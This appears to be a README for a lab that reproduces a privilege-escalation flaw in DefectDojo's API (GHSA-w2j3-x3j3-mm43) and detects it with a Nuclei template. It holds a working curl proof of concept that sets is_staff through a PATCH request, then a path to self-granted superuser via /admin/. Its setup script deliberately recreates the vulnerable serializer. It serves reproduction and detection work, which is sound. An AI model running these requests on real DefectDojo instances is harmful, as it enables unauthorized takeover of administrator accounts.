# DefectDojo — API Privilege Escalation via unguarded `is_staff` (GHSA-w2j3-x3j3-mm43)

Reproduction lab + Nuclei detection for
[GHSA-w2j3-x3j3-mm43](https://github.com/DefectDojo/django-DefectDojo/security/advisories/GHSA-w2j3-x3j3-mm43),
fixed in commit
[`68a272f`](https://github.com/DefectDojo/django-DefectDojo/commit/68a272f299d096249fd3ba9c2676bf69012857bf).

- **Product:** DefectDojo (`DefectDojo/django-DefectDojo`)
- **Type:** Privilege escalation (CWE-269) — **no CVE assigned**
- **Auth:** authenticated non-superuser holding **"Configuration → Users (change)"** (`auth.change_user`)
- **CVSS:** 7.8 — `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
- **Affected:** 2.59.0 (and the pre-fix 2.58.x line) — **Fixed:** 2.58.3, 2.58.4, 3.0.0

## How the exploit was identified (no PoC in the advisory)

Reversed from the fix diff. The API v2 `UserSerializer.validate()` guarded
`is_superuser` for non-superusers but **not `is_staff`**, while `is_staff` was a
writable serializer field. The fix adds:

```python
instance_is_staff = self.instance.is_staff if self.instance is not None else False
data_is_staff = data.get("is_staff", instance_is_staff)
if not self.context["request"].user.is_superuser and data_is_staff != instance_is_staff:
    raise ValidationError("Only superusers are allowed to add or edit staff users.")
```

**Escalation chain (two requests):**
1. A user with only `auth.change_user` sends `PATCH /api/v2/users/{id}/` with
   `{"is_staff": true}` → succeeds on vulnerable builds.
2. `is_staff` grants the Django admin (`/admin/`, on by default), where — per the
   fix's own comment — an `is_staff` user with `auth.change_user` can tick
   `is_superuser` on themselves → full superuser.

The fix also restricts `/admin/` to superusers and disables it by default.

## Spawn the vulnerable app

```bash
./setup.sh          # starts DefectDojo 2.58.2 (~7 containers), reproduces the
                    # vulnerable 2.59.0 serializer, provisions a low-priv user,
                    # prints its API token, and confirms the escalation.
# Web/API: http://127.0.0.1:8083/   admin: admin / Admin#12345
# Low-priv: lowpriv / Lowpriv#12345  (+ auth.change_user)
```

> **Reproduction note:** the affected release 2.59.0 was never published as a
> Docker image (it was superseded by 3.0.0), and the runnable 2.58.2 image does
> not expose `is_staff` at all. `setup.sh` therefore recreates 2.59.0's exact
> vulnerable state on the 2.58.2 runtime by adding the unguarded `is_staff`
> field to `UserSerializer` — it does **not** add the fix's guard.

## Manual PoC

```bash
BASE=http://127.0.0.1:8083
TOKEN=<lowpriv token printed by setup.sh>
UID=$(curl -s -H "Authorization: Token $TOKEN" "$BASE/api/v2/user_profile/" | python3 -c 'import sys,json;print(json.load(sys.stdin)["user"]["id"])')
curl -s -X PATCH -H "Authorization: Token $TOKEN" -H 'Content-Type: application/json' \
     -d '{"is_staff": true}' "$BASE/api/v2/users/$UID/"
# -> HTTP 200, body includes "is_staff":true   (patched: 400 "Only superusers are allowed to add or edit staff users")
```

## Detect with Nuclei

Provide a **non-superuser token with `auth.change_user`**:

```bash
nuclei -t nuclei/GHSA-w2j3-x3j3-mm43.yaml -u http://127.0.0.1:8083 -var token=<lowpriv-token>
```

The template resolves the token's own user id (`/api/v2/user_profile/`), sends
`PATCH … {"is_staff": true}`, and matches HTTP 200 + `"is_staff":true`
(patched builds return 400 with the guard message). A **third request reverts
`is_staff` to false** so the check leaves the account as it found it.

**Notes**
- Requires a valid low-priv token (this is an authenticated, post-auth privesc).
- The escalate→revert is net-zero on success; if interrupted between steps the
  account may remain staff — verify/revert if needed.

## Cleanup

```bash
docker compose down -v
```
